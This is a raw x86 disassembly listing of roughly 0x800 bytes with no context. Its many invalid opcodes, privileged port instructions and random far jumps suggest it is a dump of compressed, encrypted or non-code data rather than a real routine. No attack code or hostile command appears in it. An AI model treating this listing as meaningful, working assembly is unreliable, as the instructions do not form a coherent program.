  483fba:	mov    eax,0x24b61470
  483fbf:	pop    ebx
  483fc0:	jne    0x48402f
  483fc2:	stc    
  483fc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  483fc4:	(bad)  
  483fc5:	mov    bh,0xa8
  483fc7:	push   esp
  483fc8:	add    al,0x40
  483fca:	adc    edi,ebx
  483fcc:	in     al,dx
  483fcd:	dec    DWORD PTR [edx+0x6c]
  483fd0:	nop
  483fd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  483fd2:	adc    bl,bl
  483fd4:	pop    edx
  483fd5:	fmul   QWORD PTR [ebx+0x20]
  483fd8:	fild   DWORD PTR [ebx+0xc]
  483fdb:	fsubrp st(1),st
  483fdd:	or     al,0xfb
  483fdf:	add    DWORD PTR [edx],eax
  483fe1:	push   ds
  483fe2:	mov    DWORD PTR [edi+eiz*1+0x28],ebp
  483fe6:	jl     0x483fe9
  483fe8:	lods   eax,DWORD PTR ds:[esi]
  483fe9:	rcl    DWORD PTR [eax],cl
  483feb:	test   al,0x9b
  483fed:	lea    esi,[ebx+0x44]
  483ff0:	fnsave [eax+0x5704a3a8]
  483ff6:	push   ds
  483ff7:	sbb    al,0x6
  483ff9:	(bad)  
  483ffb:	fbld   TBYTE PTR [eax-0x45ea1314]
  484001:	mov    DWORD PTR ds:[esi+0x8],edi
  484005:	add    ebp,DWORD PTR [esi+0x4]
  484008:	mov    DWORD PTR [esi+0xc],ebp
  48400b:	lea    edx,[ebx+0x44]
  48400e:	out    dx,al
  48400f:	gs cld 
  484011:	adc    eax,DWORD PTR [edi]
  484013:	sub    al,0xeb
  484015:	inc    eax
  484016:	adc    bh,al
  484018:	cmp    BYTE PTR ds:0x15f916e9,al
  48401e:	je     0x484042
  484020:	in     eax,dx
  484021:	jle    0x4840a2
  484023:	sub    DWORD PTR [eax+0x538a197c],ebx
  484029:	push   esp
  48402a:	push   edx
  48402b:	ins    BYTE PTR es:[edi],dx
  48402c:	push   edx
  48402d:	mov    eax,DWORD PTR [eax-0xfb474df]
  484033:	xor    al,0x2a
  484035:	fs enter 0xb938,0x8e
  48403a:	(bad)  
  48403b:	bound  ebx,QWORD PTR [eax]
  48403d:	jg     0x484045
  48403f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  484040:	and    DWORD PTR [ecx],edx
  484042:	stos   BYTE PTR es:[edi],al
  484043:	out    dx,al
  484044:	shr    BYTE PTR [ecx],cl
  484046:	mov    dh,0x4
  484048:	fs in  eax,0x94
  48404b:	pushf  
  48404c:	or     al,BYTE PTR [ecx]
  48404e:	or     al,0x1
  484050:	or     BYTE PTR [ecx],al
  484052:	xchg   esp,eax
  484053:	outs   dx,DWORD PTR ds:[esi]
  484054:	inc    edx
  484055:	push   cs
  484056:	add    al,BYTE PTR [edi+eax*2]
  484059:	add    dh,dl
  48405b:	leave  
  48405c:	mov    WORD PTR [esi+0x7f7f4f7],ss
  484062:	pop    esi
  484063:	rol    BYTE PTR [ebx],0x68
  484066:	test   al,0x5c
  484068:	mov    WORD PTR [edi+0x74be004d],ss
  48406e:	mov    edi,0x27531a3a
  484073:	inc    eax
  484074:	mov    bl,BYTE PTR [edi]
  484076:	shl    esi,1
  484078:	push   eax
  484079:	jmp    0x87dd:0x9c200798
  484080:	cmp    al,0x85
  484082:	xchg   edi,eax
  484083:	cmp    BYTE PTR [eax-0x79],dh
  484086:	mov    bl,0x7
  484088:	std    
  484089:	jne    0x484106
  48408b:	add    DWORD PTR [edi+0x6063c0a4],ebx
  484091:	(bad)  
  484093:	mov    ebp,0x9c6ce127
  484098:	ret    
  484099:	inc    esi
  48409a:	adc    ebp,ecx
  48409c:	sub    eax,0x78
  48409f:	mov    DWORD PTR [ebp+0x1be3081d],esi
  4840a5:	rol    BYTE PTR [ebx+0x2d],cl
  4840a8:	cmp    al,0xfb
  4840aa:	or     esp,esp
  4840ac:	and    eax,0x8d35d8f7
  4840b1:	dec    ebp
  4840b2:	imul   DWORD PTR [ebp-0x75]
  4840b5:	sbb    al,0x43
  4840b7:	jmp    0x2b14:0xebd8e168
  4840be:	test   BYTE PTR [ebx],0x1b
  4840c1:	xor    ah,al
  4840c3:	mov    cl,0xf8
  4840c5:	js     0x484144
  4840c7:	lea    ecx,[edx+0x6ab57a24]
  4840cd:	dec    eax
  4840ce:	das    
  4840cf:	pmuludq mm0,QWORD PTR [eax+ecx*1]
  4840d3:	sub    bl,BYTE PTR [eax+edi*1+0x659801b0]
  4840da:	mov    ds:0x8b64262,eax
  4840df:	or     DWORD PTR [ebp+0x42],edi
  4840e2:	add    DWORD PTR [eax+0x1e42c1ef],eax
  4840e8:	sahf   
  4840e9:	push   edx
  4840ea:	or     BYTE PTR ds:0x383cb952,cl
  4840f0:	mov    eax,ebp
  4840f2:	xchg   ebp,eax
  4840f3:	and    BYTE PTR [eax+eax*2-0x76],al
  4840f7:	cmp    eax,0x588aeec0
  4840fc:	jl     0x48408d
  4840fe:	xchg   edi,eax
  4840ff:	and    al,0x97
  484101:	sub    esp,esp
  484103:	dec    edx
  484104:	dec    esp
  484105:	dec    eax
  484106:	and    dl,BYTE PTR ds:0x4ed76226
  48410c:	rol    DWORD PTR [edx],0xf8
  48410f:	inc    ecx
  484110:	mov    eax,ds:0x3a920598
  484115:	add    bh,BYTE PTR [edi]
  484117:	push   cs
  484118:	sahf   
  484119:	pop    esp
  48411a:	jns    0x484157
  48411c:	sbb    ecx,DWORD PTR ds:0xeb07e0f8
  484122:	or     al,0x1a
  484124:	inc    esp
  484125:	add    ah,BYTE PTR [ecx+0x45]
  484128:	add    al,0xc7
  48412a:	and    BYTE PTR [ebx-0x77],ah
  48412d:	pop    ss
  48412e:	push   ds
  48412f:	add    al,BYTE PTR [esp+esi*1]
  484132:	in     al,0x99
  484134:	sub    BYTE PTR [edi+eiz*2-0x38],bl
  484138:	jmp    0xba8b5978
  48413d:	add    al,0x25
  48413f:	push   edx
  484140:	or     dh,BYTE PTR [ecx-0x778a1dd3]
  484146:	jecxz  0x4841b0
  484148:	dec    ecx
  484149:	mov    esi,0xe4cb0462
  48414e:	(bad)  
  48414f:	mov    eax,0x2bc62be0
  484154:	ret    
  484155:	(bad)  
  484156:	cmp    esi,DWORD PTR [esi-0x1b82c723]
  48415c:	push   edi
  48415d:	test   BYTE PTR [ebx],0xc3
  484160:	dec    ebx
  484161:	mov    al,0x45
  484163:	mov    ah,0x5f
  484165:	mov    ebx,0xc72b704d
  48416a:	cmp    al,0x54
  48416c:	(bad)  
  48416d:	aaa    
  48416e:	call   0xbdf1849e
  484173:	out    dx,eax
  484174:	mov    DWORD PTR cs:[ebx],ebp
  484177:	inc    ebp
  484178:	loopne 0x4841a9
  48417a:	in     al,dx
  48417b:	or     dl,BYTE PTR [esi-0x7f]
  48417e:	and    dl,BYTE PTR [ecx+0x69]
  484181:	fld    QWORD PTR [ebp-0x1c]
  484184:	adc    DWORD PTR [edi+0x33],0xffffff83
  484188:	sbb    BYTE PTR [ebp+0x62ff0428],ah
  48418e:	add    DWORD PTR [ebx],0x952b6437
  484194:	xor    BYTE PTR [edx],0x30
  484197:	mov    al,BYTE PTR ds:0x8a8946e7
  48419d:	pop    esp
  48419e:	gs jmp 0xf90b:0x4a9c17e8
  4841a6:	es mov cl,0x1
  4841a9:	out    0x8b,eax
  4841ab:	cli    
  4841ac:	sub    BYTE PTR [ecx+0x6f0407d1],cl
  4841b2:	or     BYTE PTR [edx-0x7e31da35],al
  4841b8:	adc    DWORD PTR [eax+0x1dc6e0c8],ecx
  4841be:	(bad)  
  4841bf:	out    dx,al
  4841c0:	jne    0x4841d2
  4841c2:	aaa    
  4841c3:	sbb    al,0xbb
  4841c5:	addr16 jo 0x484228
  4841c8:	es pop ebp
  4841ca:	dec    eax
  4841cb:	and    al,0x5
  4841cd:	pop    esp
  4841ce:	je     0x4841bf
  4841d0:	xchg   esp,eax
  4841d1:	sbb    DWORD PTR ds:0x8e478a93,0x5c740772
  4841db:	cmp    dh,BYTE PTR [eax]
  4841dd:	push   esi
  4841de:	dec    ecx
  4841df:	jmp    0x39c2:0x1725609
  4841e6:	pop    ecx
  4841e7:	cmp    BYTE PTR [edx+eiz*1+0x53],bl
  4841eb:	add    BYTE PTR ss:[ecx+ebp*8],bh
  4841ef:	xchg   edx,eax
  4841f0:	push   edx
  4841f1:	or     al,0xc2
  4841f3:	adc    DWORD PTR [esi+0x4203c142],esp
  4841f9:	or     al,0xc
  4841fb:	les    edx,FWORD PTR [ebx]
  4841fd:	and    DWORD PTR [ebx+0x43c06ed5],ebp
  484203:	adc    al,0x44
  484205:	ficomp WORD PTR [ebx-0x47b7a21b]
  48420b:	mov    bl,BYTE PTR [edx+0x19a235dc]
  484211:	sbb    DWORD PTR [ebp+0x990bc9c],0xb53118b7
  48421b:	dec    ecx
  48421c:	xchg   ecx,eax
  48421d:	jbe    0x48427f
  48421f:	xor    cl,bl
  484221:	add    DWORD PTR [edx-0x40],0xccbf1990
  484228:	add    edi,DWORD PTR [eax+0x546a58c3]
  48422e:	jne    0x2b3c8f1
  484234:	ror    BYTE PTR [edi],0xe7
  484237:	cmp    eax,0x212e34cb
  48423c:	add    DWORD PTR [ecx+0x2b],0xec40c1dc
  484243:	and    eax,0x6a31d3eb
  484248:	add    cl,BYTE PTR [edi-0xecc64f0]
  48424e:	sub    DWORD PTR [bx+si-0x5d15],ebx
  484253:	dec    eax
  484254:	add    dh,BYTE PTR [edx+edi*1-0x79fb23ac]
  48425b:	inc    eax
  48425c:	and    DWORD PTR gs:[eax+0x42],ebp
  484260:	pop    edi
  484261:	fcom   QWORD PTR [ebx+0x2f487ee]
  484267:	ins    BYTE PTR es:[edi],dx
  484268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  484269:	sbb    DWORD PTR [eax+0x6d],eax
  48426c:	and    DWORD PTR [ecx+0x3ff76012],esi
  484272:	js     0x484233
  484274:	sbb    al,0x70
  484276:	ret    
  484277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  484278:	dec    esp
  484279:	int3   
  48427a:	push   eax
  48427b:	pop    ss
  48427c:	pop    ebp
  48427d:	or     edx,DWORD PTR [ebx+0xd]
  484280:	ror    al,cl
  484282:	aaa    
  484283:	in     al,0x97
  484285:	ins    BYTE PTR es:[edi],dx
  484286:	test   bl,cl
  484288:	inc    eax
  484289:	jecxz  0x484218
  48428b:	jne    0x484259
  48428d:	or     DWORD PTR [edi-0x7c],edi
  484290:	not    DWORD PTR [esi+0x3d]
  484293:	or     ax,WORD PTR [eax-0x62]
  484297:	sti    
  484298:	jmp    0x906574ab
  48429d:	loopne 0x484252
  48429f:	rol    DWORD PTR [eax],1
  4842a1:	mov    ebx,0x54311b59
  4842a6:	mov    eax,0xfb2c2388
  4842ab:	sub    DWORD PTR [eax],0x5bf3898c
  4842b1:	popf   
  4842b2:	les    ebp,FWORD PTR [ebx]
  4842b4:	les    edi,FWORD PTR [edx]
  4842b6:	mov    esi,0x93382a47
  4842bb:	pop    ss
  4842bc:	shl    BYTE PTR [ecx],0xf4
  4842bf:	bound  ebp,QWORD PTR [edi]
  4842c1:	sbb    eax,DWORD PTR ds:0x2b0c7074
  4842c7:	or     ebx,ecx
  4842c9:	mov    cl,0xc3
  4842cb:	adc    DWORD PTR [edx],0xa082ffdb
  4842d1:	push   cs
  4842d2:	sbb    DWORD PTR [ebp+0x1f],esi
  4842d5:	cmp    eax,0x3403560c
  4842da:	mov    DWORD PTR [eax+0x4],edi
  4842dd:	or     al,BYTE PTR [eax]
  4842df:	xlat   BYTE PTR ds:[ebx]
  4842e0:	or     al,0xc1
  4842e2:	lock mov esp,0xf5501054
  4842e8:	imul   ebp,DWORD PTR [ecx+0x33],0x58
  4842ec:	adc    BYTE PTR [edi-0x73],dl
  4842ef:	js     0x48431f
  4842f1:	jne    0x484369
  4842f3:	iret   
  4842f4:	in     al,0x7e
  4842f6:	sbb    DWORD PTR [edi+0x6a],0x1
  4842fa:	imul   ebx,DWORD PTR [ebx+ebp*4+0x78],0x2004c577
  484302:	lock call 0xb20f9458
  484308:	push   edx
  484309:	retf   
  48430a:	and    ebx,DWORD PTR [edx]
  48430c:	icebp  
  48430d:	sbb    ecx,DWORD PTR ss:[ebx+0x22]
  484311:	es cs psubq mm7,mm0
  484316:	mov    BYTE PTR [eax+0x4fe0ef8b],ah
  48431c:	clc    
  48431d:	mov    ebx,DWORD PTR [edi+0x38d1e00b]
  484323:	jnp    0x484397
  484325:	iret   
  484326:	dec    eax
  484327:	daa    
  484328:	or     BYTE PTR [eax+0xd],bl
  48432b:	sbb    edi,edi
  48432d:	rcl    DWORD PTR [ebx],1
  48432f:	pop    ds
  484330:	xor    al,0xea
  484332:	aam    0x15
  484334:	sbb    esp,ecx
  484336:	popa   
  484337:	xor    dl,BYTE PTR [eax+0x3b7d1b66]
  48433d:	imul   BYTE PTR [eax+0x19501425]
  484343:	or     BYTE PTR fs:[edi-0x37e6729d],ah
  48434a:	adc    BYTE PTR [ebx+0x49318c86],bh
  484350:	jmp    0x10646876
  484355:	pop    eax
  484356:	or     ah,BYTE PTR [eax]
  484358:	dec    ebx
  484359:	test   eax,0x2fdf31d4
  48435e:	cmp    BYTE PTR [esi],ah
  484360:	add    DWORD PTR [edi-0x11],esp
  484363:	jle    0x484366
  484365:	and    bl,BYTE PTR [esi]
  484367:	inc    eax
  484368:	or     eax,0x51adc206
  48436d:	mov    ah,0xc2
  48436f:	sbb    eax,0xb5519438
  484374:	les    esi,FWORD PTR [ebp+0x498e04c0]
  48437a:	rcr    BYTE PTR [ebx+0x640ca560],0xbf
  484381:	sti    
  484382:	and    ebx,esp
  484384:	hlt    
  484385:	inc    esi
  484386:	int3   
  484387:	pop    ebx
  484388:	add    eax,0xd4e64d74
  48438d:	sti    
  48438e:	inc    esi
  48438f:	cdq    
  484390:	mov    ecx,esi
  484392:	adc    ecx,DWORD PTR [edx+ecx*4]
  484395:	or     al,0xf6
  484397:	nop    DWORD PTR [eax-0x79]
  48439b:	iret   
  48439c:	mov    dl,BYTE PTR [esi+0x5b]
  48439f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4843a0:	sbb    BYTE PTR [edi-0x7e],dl
  4843a3:	les    eax,FWORD PTR [ecx+ecx*8-0x7f023e3a]
  4843aa:	test   al,0x96
  4843ac:	dec    ecx
  4843ad:	popa   
  4843ae:	jbe    0x4843d6
  4843b0:	scas   al,BYTE PTR es:[edi]
  4843b1:	pop    esp
  4843b2:	ret    
  4843b3:	inc    BYTE PTR [di+0x19d6]
  4843b8:	sub    dl,0x3
  4843bb:	jae    0x4843cb
  4843bd:	mov    edx,DWORD PTR [edx+eiz*2-0x77]
  4843c1:	or     al,BYTE PTR ds:0x80870332
  4843c7:	popa   
  4843c8:	pop    ss
  4843c9:	btr    DWORD PTR [esi],ebp
  4843cc:	mov    bh,0x1
  4843ce:	pop    edi
  4843cf:	xlat   BYTE PTR ds:[ebx]
  4843d0:	cdq    
  4843d1:	xor    BYTE PTR [ebp+0x48],al
  4843d4:	adc    BYTE PTR [edi],bl
  4843d6:	mov    dh,0xc
  4843d8:	and    ecx,DWORD PTR [edx+0xd]
  4843db:	inc    eax
  4843dc:	xor    al,0xcf
  4843de:	dec    edi
  4843df:	pop    eax
  4843e0:	ja     0x484371
  4843e2:	retf   0x1b00
  4843e5:	or     al,0xce
  4843e7:	in     eax,0x82
  4843e9:	daa    
  4843ea:	xchg   edi,eax
  4843eb:	cdq    
  4843ec:	int3   
  4843ed:	enter  0xa1f1,0xe9
  4843f1:	add    al,0x57
  4843f3:	clc    
  4843f4:	xchg   esp,eax
  4843f5:	push   ebx
  4843f6:	js     0x484415
  4843f8:	jmp    0x1e7a:0x85cc4537
  4843ff:	add    BYTE PTR ds:0x7622a231,dl
  484405:	inc    ebx
  484406:	mov    edi,0x6f60f19a
  48440b:	inc    eax
  48440c:	add    al,0x7e
  48440e:	xor    al,BYTE PTR [ecx-0x53f096ad]
  484414:	dec    BYTE PTR [esp+esi*2+0x14050e1c]
  48441b:	mov    al,0x50
  48441d:	call   0xb48c:0x60c004a
  484424:	add    BYTE PTR [esp+eiz*8-0xfc8484f],ch
  48442b:	mov    eax,0x50ae06d0
  484430:	je     0x4843bd
  484432:	loop   0x484406
  484434:	jbe    0x48443b
  484436:	repz pop ebp
  484438:	adc    DWORD PTR [esp+ebp*2-0x7a],esi
  48443c:	ror    BYTE PTR [edi+eiz*1],cl
  48443f:	adc    BYTE PTR [esi+0x6c61fbb],bh
  484445:	mov    esi,0xe2806eb
  48444a:	sub    ecx,DWORD PTR [esp+ebx*4]
  48444d:	pop    esp
  48444e:	dec    esi
  48444f:	dec    esi
  484450:	or     BYTE PTR [eax],cl
  484452:	or     BYTE PTR [esi+eax*4],cl
  484455:	inc    edi
  484456:	js     0x4843f0
  484458:	rcr    DWORD PTR [esi+0x10],0x52
  48445c:	fstp   QWORD PTR [esi+0x3e30e325]
  484462:	fnstcw WORD PTR [esp+eax*4-0x34]
  484466:	xchg   edx,eax
  484467:	pusha  
  484468:	sbb    DWORD PTR [eax],ecx
  48446a:	or     BYTE PTR fs:[eax],0x4f
  48446e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48446f:	nop
  484470:	pusha  
  484471:	popf   
  484472:	mov    al,es:0x530c2a28
  484478:	jns    0x484487
  48447a:	mov    bh,BYTE PTR [eax]
  48447c:	add    eax,0xc5006c1
  484481:	pop    es
  484482:	imul   ebx,esi,0x20ccb15
  484488:	pop    es
  484489:	jmp    0x4844a0
  48448b:	sub    al,0x4
  48448d:	push   cs
  48448e:	and    BYTE PTR [edi],ah
  484490:	ds jl  0x484497
  484493:	jge    0x48449b
  484495:	or     eax,0x4072a907
  48449a:	fwait
  48449b:	dec    ebp
  48449c:	daa    
  48449d:	fcomp  QWORD PTR [eax-0x80]
  4844a0:	cdq    
  4844a1:	inc    esi
  4844a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4844a4:	adc    BYTE PTR ds:0x9179090c,ch
  4844aa:	sahf   
  4844ab:	and    ecx,DWORD PTR [ecx]
  4844ad:	sub    eax,DWORD PTR [eax-0x48]
  4844b0:	or     al,0x9
  4844b2:	test   DWORD PTR [ecx+eax*2+0xd],edx
  4844b6:	ins    BYTE PTR es:[edi],dx
  4844b7:	xchg   edx,edi
  4844b9:	add    DWORD PTR [ecx+0x3f54491b],esp
  4844bf:	dec    esp
  4844c0:	mov    DWORD PTR [ebx-0x612cd614],eax
  4844c6:	rcl    BYTE PTR [eax],1
  4844c8:	dec    eax
  4844c9:	mov    edx,0x7c09eaac
  4844ce:	mov    eax,0xbb804351
  4844d3:	pushf  
  4844d4:	(bad)  
  4844d5:	aad    0x28
  4844d7:	aam    0x95
  4844d9:	mov    dl,cl
  4844db:	cli    
  4844dc:	pop    ebx
  4844dd:	pop    edx
  4844de:	jae    0x484523
  4844e0:	push   ds
  4844e1:	stc    
  4844e2:	mov    esi,0x42b4670b
  4844e7:	jmp    0x48450a
  4844e9:	add    DWORD PTR [edi+ecx*1+0x4],esi
  4844ed:	arpl   cx,di
  4844ef:	fiadd  WORD PTR [edi*8-0x4f64f6bc]
  4844f6:	imul   ebx,DWORD PTR [edx],0x49
  4844f9:	mov    ebx,0x494048f0
  4844fe:	inc    esp
  4844ff:	sub    ebx,DWORD PTR [edx]
  484501:	addr16 jne 0x484549
  484504:	ror    BYTE PTR [eax+0x4c],cl
  484507:	sub    esp,DWORD PTR [ecx]
  484509:	dec    esp
  48450a:	mov    ecx,0xcf11245
  48450f:	aaa    
  484510:	(bad)  
  484511:	scas   eax,DWORD PTR es:[edi]
  484512:	add    DWORD PTR [ebx],ecx
  484514:	push   0x367418e1
  484519:	push   ss
  48451a:	and    bl,BYTE PTR [edi]
  48451c:	inc    edx
  48451d:	enter  0x6704,0xf4
  484521:	add    BYTE PTR [edi-0x4],al
  484524:	aam    0x10
  484526:	adc    BYTE PTR [eax+0x56f0250],bh
  48452c:	popf   
  48452d:	xchg   esp,eax
  48452e:	ins    DWORD PTR es:[edi],dx
  48452f:	sbb    BYTE PTR [edx],0x8b
  484532:	cmp    BYTE PTR [esi+0x1a837377],0xc6
  484539:	and    al,0x84
  48453b:	test   DWORD PTR [edi],edi
  48453d:	add    DWORD PTR [ebx],eax
  48453f:	cmp    eax,0x48050c00
  484544:	in     al,dx
  484545:	repz jb 0x48457f
  484548:	cmp    eax,0x8b307708
  48454d:	mov    dh,0x12
  48454f:	into   
  484550:	js     0x4844e9
  484552:	dec    ebx
  484553:	gs jle 0x4845c4
  484556:	xchg   edi,eax
  484557:	mov    ah,0xcf
  484559:	ins    DWORD PTR es:[edi],dx
  48455a:	shr    cl,0x75
  48455d:	add    al,0x62
  48455f:	adc    BYTE PTR [edx+0x7f],ah
  484562:	stos   BYTE PTR es:[edi],al
  484563:	maxps  xmm6,XMMWORD PTR [eax+0x76]
  484567:	fild   WORD PTR [edx+0xa3d32d2]
  48456d:	adc    eax,0x5026c787
  484572:	xor    BYTE PTR [ebp+0x14],0x2d
  484576:	jo     0x4845bf
  484578:	push   edx
  484579:	pop    DWORD PTR [ebx]
  48457b:	mov    bh,0xa
  48457d:	push   edx
  48457e:	add    eax,0x15b24808
  484583:	and    BYTE PTR [ebx+ebp*1],0x2
  484587:	bound  ecx,QWORD PTR [edx]
  484589:	jbe    0x48455e
  48458b:	dec    BYTE PTR [ecx+0x1d74480b]
  484591:	add    al,0x37
  484593:	pop    ss
  484594:	jmp    0x4845cf
  484596:	ret    0x77aa
  484599:	mov    eax,ds:0x536d936
  48459e:	add    ah,cl
  4845a0:	mov    ch,0x48
  4845a2:	repnz add al,0x1
  4845a5:	mov    BYTE PTR [ebp-0x2a],bl
  4845a8:	(bad)  
  4845a9:	in     eax,dx
  4845aa:	clc    
  4845ab:	test   BYTE PTR [ebp-0x23],0x2b
  4845af:	imul   edx,DWORD PTR [eax+0x4e],0x54
  4845b3:	add    ebx,ebp
  4845b5:	jle    0x4845c3
  4845b7:	push   sp
  4845b9:	(bad)  
  4845ba:	jmp    0x484633
  4845bc:	ficom  WORD PTR [ecx-0x7f602157]
  4845c2:	cmp    ch,BYTE PTR [ebp+edx*1+0xf]
  4845c6:	mov    dl,0x56
  4845c8:	add    al,0x21
  4845ca:	popa   
  4845cb:	les    ebp,FWORD PTR [ebx]
  4845cd:	inc    esi
  4845ce:	cs inc eax
  4845d0:	clc    
  4845d1:	cmp    eax,DWORD PTR [edx+0x1c]
  4845d4:	jne    0x48462a
  4845d6:	push   ebx
  4845d7:	or     DWORD PTR [eax+ecx*4+0x36],0xfffffff6
  4845dc:	cwde   
  4845dd:	add    ebx,DWORD PTR [edx]
  4845df:	and    ebp,ecx
  4845e1:	mov    es,WORD PTR [esi-0xb71f6af]
  4845e7:	lea    edx,[ecx+0x2a6a871e]
  4845ed:	idiv   BYTE PTR [ebx]
  4845ef:	adc    al,0xbf
  4845f1:	je     0x484623
  4845f3:	add    BYTE PTR [esi+0x20],bl
  4845f6:	cmp    eax,0x94530854
  4845fb:	jle    0x484627
  4845fd:	pop    edx
  4845fe:	pusha  
  4845ff:	mov    ecx,DWORD PTR [ebx-0x38]
  484602:	ror    bh,1
  484604:	clc    
  484605:	add    BYTE PTR [ebx],cl
  484607:	xchg   edi,eax
  484608:	cmp    al,0xdd
  48460a:	inc    esi
  48460b:	(bad)  
  48460c:	in     al,dx
  48460d:	push   ecx
  48460e:	jne    0x48463b
  484610:	clc    
  484611:	add    dl,BYTE PTR [ebx]
  484613:	or     al,0x74
  484615:	dec    edi
  484616:	stos   BYTE PTR es:[edi],al
  484617:	add    eax,0x70eb2f04
  48461c:	and    eax,0x8f22fc40
  484621:	add    eax,0x373bdcd5
  484626:	mov    ch,0xb8
  484628:	add    al,0x7e
  48462a:	adc    dl,BYTE PTR [eax-0x8fa25b7]
  484630:	xchg   ecx,eax
  484631:	add    al,0xbd
  484633:	jns    0x484699
  484635:	or     DWORD PTR [ebx+ebp*2+0x10],eax
  484639:	call   0xff58:0x7e680c44
  484640:	cmp    esp,eax
  484642:	pop    ecx
  484643:	or     BYTE PTR [ebx],0x1a
  484646:	xor    eax,0x69773392
  48464b:	add    esi,DWORD PTR [edi+0x29]
  48464e:	pop    esp
  48464f:	push   ebp
  484650:	jp     0x4845f0
  484652:	imul   edi,DWORD PTR [ecx],0x14314685
  484658:	mov    DWORD PTR [eax],esi
  48465a:	push   eax
  48465b:	adc    dl,BYTE PTR [eax]
  48465d:	es or  eax,0xcd7f1331
  484663:	adc    dh,BYTE PTR [eax-0x39b583b]
  484669:	mov    BYTE PTR [ebx+0x5e],al
  48466c:	loope  0x484615
  48466e:	mov    dh,BYTE PTR [ebp+0x2c]
  484671:	neg    BYTE PTR [esi+0x18]
  484674:	mov    BYTE PTR [ecx+ebp*8-0x20],cl
  484678:	inc    edx
  484679:	pop    ebp
  48467a:	xchg   ebx,edi
  48467c:	and    BYTE PTR [edx+0x14],al
  48467f:	clc    
  484680:	adc    ecx,DWORD PTR [ecx]
  484682:	fsub   QWORD PTR [esp+edi*1]
  484685:	fwait
  484686:	cmp    al,BYTE PTR [edx+0x5e]
  484689:	mov    bh,0xca
  48468b:	xchg   esp,eax
  48468c:	or     esi,DWORD PTR [ecx+esi*2]
  48468f:	sub    al,0x6
  484691:	scas   eax,DWORD PTR es:[edi]
  484692:	sub    dl,BYTE PTR [ebx+0x67]
  484695:	push   0x179a08
  48469a:	ret    0x11f9
  48469d:	sbb    al,0xce
  48469f:	add    edx,DWORD PTR [ecx]
  4846a1:	and    al,0x47
  4846a3:	pusha  
  4846a4:	and    eax,0x43219c3f
  4846a9:	pop    esi
  4846aa:	gs pusha 
  4846ac:	and    ecx,DWORD PTR [ecx+ecx*2-0x4f530bf9]
  4846b3:	jo     0x48466c
  4846b5:	test   al,0x22
  4846b7:	add    DWORD PTR ds:0xcd41adb4,ebp
  4846bd:	retf   
  4846be:	cmp    al,0xce
  4846c0:	adc    eax,0xab103803
  4846c5:	xor    BYTE PTR [ebx],bh
  4846c7:	cmp    DWORD PTR [esp+edx*1-0x6c],0xffffffde
  4846cc:	fadd   st,st(3)
  4846ce:	and    DWORD PTR [edx*2-0x7ad658e0],0xffffffc6
  4846d6:	(bad)  
  4846d7:	adc    cl,dh
  4846d9:	ss or  al,0xda
  4846dc:	mov    cl,0x5f
  4846de:	or     ah,BYTE PTR [ebp-0x62e714e8]
  4846e4:	push   cs
  4846e5:	arpl   WORD PTR [ebx+0x2610a5e4],bx
  4846eb:	sub    al,BYTE PTR [ecx]
  4846ed:	sub    al,0x39
  4846ef:	sbb    DWORD PTR [ebx],ecx
  4846f1:	mov    ch,ah
  4846f3:	sub    BYTE PTR [edi-0x79935e48],bl
  4846f9:	push   ds
  4846fa:	mov    ds:0x53bc00d2,al
  4846ff:	jns    0x48473f
  484701:	or     cl,BYTE PTR ds:0xd4ca8bd8
  484707:	rol    BYTE PTR [edx-0x60],1
  48470a:	mov    al,ds:0x82f0ff88
  48470f:	xchg   DWORD PTR [edx+0x5147f6d3],ebx
  484715:	xor    BYTE PTR [esi-0x7f],ah
  484718:	jg     0x484762
  48471a:	add    DWORD PTR [ebx],ebp
  48471c:	in     eax,dx
  48471d:	mov    cl,0xe
  48471f:	jg     0x48472a
  484721:	adc    BYTE PTR [esi+edi*2+0x2f],cl
  484725:	mov    edx,0x3373c6c2
  48472a:	add    ecx,DWORD PTR [eax+eiz*8]
  48472d:	dec    ecx
  48472e:	xor    ax,0x1874
  484732:	inc    ebx
  484733:	sbb    eax,0xa5ea8ec
  484738:	jl     0x48470c
  48473a:	jno    0x4846ce
  48473c:	ret    0xe400
  48473f:	aad    0x25
  484741:	movsx  eax,WORD PTR [edx]
  484744:	in     eax,dx
  484745:	sbb    DWORD PTR [eax+ecx*4],esp
  484748:	or     BYTE PTR [edx],cl
  48474a:	dec    ebp
  48474b:	pop    eax
  48474c:	mov    cl,0x88
  48474e:	adc    BYTE PTR [ecx],al
  484750:	iret   
  484751:	mov    eax,0x1d3c28
  484756:	ret    
  484757:	shr    BYTE PTR [ecx],1
  484759:	jnp    0x4846e4
  48475b:	sub    dl,BYTE PTR [esi+0x4c]
  48475e:	add    dl,BYTE PTR [edx+0x2f]
  484761:	jg     0x48476d
  484763:	mov    ds:0x1c98fef7,al
  484768:	or     BYTE PTR [edx+ebp*8],cl
  48476b:	add    ah,BYTE PTR [eax-0x57baccc8]
  484771:	test   eax,0x1b74a423
  484776:	sub    DWORD PTR [eax+ecx*4-0x25],ebp
  48477a:	adc    ch,BYTE PTR [eax-0x6f]
  48477d:	and    edx,DWORD PTR [esi]
  48477f:	xor    al,0x62
  484781:	xchg   edi,eax
  484782:	jmp    FWORD PTR [eax]
  484784:	lods   al,BYTE PTR ds:[esi]
  484785:	nop
  484786:	imul   edx,ecx,0xffffffd7
  484789:	xor    al,0xe4
  48478b:	jnp    0x4847f6
  48478d:	ret    
  48478e:	jmp    0xd825f033
  484793:	mov    WORD PTR [ebp+0x40434d28],ds
  484799:	lahf   
  48479a:	jl     0x48475f
  48479c:	xor    al,0x21
  48479e:	inc    esp
  48479f:	fdiv   QWORD PTR [edi-0x17]
  4847a2:	jnp    0x4847ab
  4847a4:	or     al,BYTE PTR [edi+0x2dc56192]
  4847aa:	imul   esp,DWORD PTR [esi+ecx*8],0xc7aa2d2
  4847b1:	or     al,0x2b
  4847b3:	lods   al,BYTE PTR ds:[esi]
  4847b4:	ret    0x65e8
  4847b7:	in     al,0x5b
  4847b9:	push   esi
  4847ba:	sbb    eax,0x3e5c26a8
  4847bf:	mov    dh,0x3d
  4847c1:	test   DWORD PTR [esi],ebx
